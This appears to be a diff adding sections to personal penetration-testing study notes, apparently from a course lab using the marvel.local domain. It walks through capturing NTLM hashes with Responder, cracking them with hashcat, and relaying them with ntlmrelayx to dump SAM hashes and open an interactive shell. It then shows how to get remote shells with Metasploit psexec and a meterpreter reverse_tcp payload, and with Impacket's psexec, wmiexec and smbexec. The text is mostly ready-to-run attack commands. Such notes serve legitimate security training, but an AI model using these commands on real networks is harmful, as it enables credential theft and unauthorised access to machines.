@@ -14,3 +14,75 @@ once responder picks up a username and hash, we can make use of hashcat or other
 Make sure to put the username and hash in a file. check hashcat --help to find the module for the type of hash you need to crack. NTLM is the standard Windows hash and the module for that is 5600. 
 hashcat -m 5600 ntlmhash.txt /usr/share/wordlists/rockyou.txt
 If you need another password list, google "password seclist".
+
+2. SMB Relay
+
+Here, rather than cracking the password hash from the LLMNR poisoning done above, we are going to relay that hash to another machine on the network and attempt to gain access. Note, we can not relay back to the same machine. SMB signing must be disabled and the user has to be admin on the other machine. 
+
+To start with, we need to run a check to see which systems on the network have SMB signing disabled. We can use Nessus, nmap or even a github script to do that.
+
+nmap: 
+syntax: nmap --script=smb2-security-mode.nse -p445 10.0.1.0/24 
+The server will have signing enabled and required, but any desktop machines will generally have it enabled, but not required and that means we can take advantage of that. 
+From that scan, create a list on kali with the IP´s of the machines that have it enabled, but not required. 
+Now, we need to edit the Responder conf file and disable SMB and HTTP.
+syntax: nano /etc/responder/Responder.conf
+Run Responder:
+syntax: responder -I eth0 -rdwv (check at the top that HTTP and SMB are off)
+In another tab, we need to set up the relay: 
+syntax: ntlmrelayx.py -tf targets.txt -smb2support
+check the response on the relay and you should get a dump of the SAM hashes, which is the Windows equivalent of the /etc/shadow file on Linux. Note, these are local users, not the Domain users. 
+save the hashes for later cracking. 
+
+We can also try to get an interactive shell on the machine, by adding a -i to the end of the relay command. 
+
+So, run responder:
+responder -I eth0 -rdwv (note, HTTP and SMB should still be disabled)
+then run the relay:
+ntlmrelayx.py -tf targets.txt -smb2support -i
+now, on another tab, run:
+nc 127.0.0.1 portnr (it will show the open port number in the relay output).
+type: help
+we are on the share now, but we can type: 
+shares
+this will show all the shares
+we can type:
+use C$
+this will take us to the C drive (if it is listed in the shares)
+use ADMIN$ 
+will give us access to the Systems folder. 
+Note, there are additional methods we can use rather than just the interactive shell in the relay command. We could create a meterpreter shell or get the relay to run a command (think Powershell).
+
+3. Gaining Shell Access
+
+If we have local users, then we can use msfconsole to gain a shell. Note, this is based on the username and password we cracked earlier in LLMNR. 
+
+syntax: msfconsole
+search psexec
+look for smb/psexec, which seems to be nr 10 in msfconsole
+use 10
+options
+set RHOSTS IP
+set SMBDomain DOMAIN
+set SMBPass CrackedPassword
+set SMBUser user
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST eth0
+run
+Note, this might not work on the first run. Try again. If it still does not work, try running options again. 
+Set a new TARGET
+set TARGET 2
+run
+
+If it still does not work, we can try a different tool. 
+
+psexec.py
+Syntax: psexec.py marvel.local/fcastle:Password1@10.0.1.6
+
+We can also try:
+
+syntax: wmiexec.py marvel.local/fcastle:Password1@10.0.1.6
+
+or
+
+syntax: smbexec.py marvel.local/fcastle:Password1@10.0.1.6
